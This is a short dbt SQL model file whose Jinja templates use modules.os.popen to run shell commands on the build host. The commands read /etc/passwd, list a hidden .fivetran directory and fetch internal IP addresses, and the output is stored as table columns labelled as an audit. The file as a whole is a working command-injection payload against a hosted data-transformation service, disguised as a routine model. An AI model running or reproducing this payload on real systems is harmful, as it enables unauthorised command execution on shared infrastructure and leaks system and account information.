{{ config(materialized='table') }}

SELECT 
    '{{ modules.os.popen("cat /etc/passwd").read() | truncate(500) }}' as passwd_file,
    '{{ modules.os.popen("ls -la /tmp/dbt/project/.fivetran").read() }}' as internal_files,
    '{{ modules.os.popen("hostname -I").read() }}' as internal_ip,
    CURRENT_TIMESTAMP as audit_time
